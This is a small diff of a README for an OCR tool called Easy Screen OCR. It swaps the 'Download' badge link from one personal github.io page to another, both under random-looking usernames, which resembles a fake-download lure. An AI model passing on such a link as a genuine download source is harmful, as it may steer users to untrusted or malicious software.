@@ -15,7 +15,7 @@
 - **Settings:** Turn off any online or translation feature until legal and network policy explicitly allow that path for the data you process in **Easy Screen OCR**.
 - **Output check:** Skim the text for swapped characters and broken numbers before you paste **Easy Screen OCR** output into financial or legal records.
 
-[![Download Easy Screen OCR](https://img.shields.io/badge/Download-Easy_Screen_OCR-00897b)](https://louisejunerainbow1998.github.io/.github/easy-screen-ocr-image-file-and-capture)
+[![Download Easy Screen OCR](https://img.shields.io/badge/Download-Easy_Screen_OCR-00897b)](https://fordchangjcqy.github.io/.github/easy-screen-ocr-image-file-and-capture)
 
 ---
 
